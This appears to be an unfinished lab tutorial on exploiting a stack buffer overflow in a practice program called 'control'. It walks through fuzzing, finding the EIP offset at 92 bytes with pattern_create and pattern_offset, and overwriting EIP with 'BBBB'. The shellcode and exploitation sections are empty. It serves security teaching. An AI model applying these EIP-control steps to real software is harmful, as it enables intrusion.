1. Meet the 'control' program

This is a program of which you will take control in this tutorial.
But first run it and check what it can do:

```
make
$ ./control 
Press Ctrl+C or type end to quit
Command: help
	dir - lists the current directory
	cd [folder] - switches the current directory
	end - leave the program
	help - shows this help
```

Try playing with it.

Can you find a problem in it giving it some unusual input?

2. Fuzzing

Providing random output to the program might find weak spots in it. 

Have a look at the fuzz.py program, which generates some output of
a given size. Use it to generate input for the control program.

```
make fuzz
```

See if you can achieve a crash.

How many 'A's were needed to crash the program? Why?

4. Debugging the crash

Let's start investigation why the crash happens. 

```
make debug
```

Let the program run with F9 and supply an input long enough to cause the crash.

What happens to the program?
What is the value of the EIP after the crash?

5. Controlling EIP

We need to find out, which bytes overwrite EIP.

Let's use patter-create tool in Kali for this:

```
pattern_create.rb -l 120
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9
```
This tool generates a sequence, each 4 bytes of which are uniquely 
recognizable.

When the output of this pattern_create.rb is given as a 
command to control, the program stops with EIP 
overwritten with 0x31644130.

Let's paste it to the pattern_offset script to find out the 
place.

```
pattern_offset.rb -q 0x31644130
[*] Exact match at offset 92
```
Now let's replace EIP with BBBB and debug again, in python:
```
>>> print "A" * 92 + "BBBB"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
```

Run the control program, run the debugger as root, attach to 
the process and paste the output.

```
$ ./control 
Press Ctrl+C or type end to quit
Command: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
```

The EIP is overwritten with B's 0x42424242.

6. Finding place for shell code


7. Bad characters

8. Shell code generation

9. Exploitation




x. Additional info and tasks

What happens if you compile the program with the stack protector?
Is it still vulnerable? 
Is the graceful crash caused by canaries a problem?

What are other vulnerabilities of the program?
Are they exploitable? Could you exploit them?
Could you fix these vulnerabilities?






















































































Hello cheaters :) 

Let's give you some tips here. 

Is the getcwd() call safe? Can it be fixed if no?

What happens if you feed \x00 to the command line?

How about EOF?


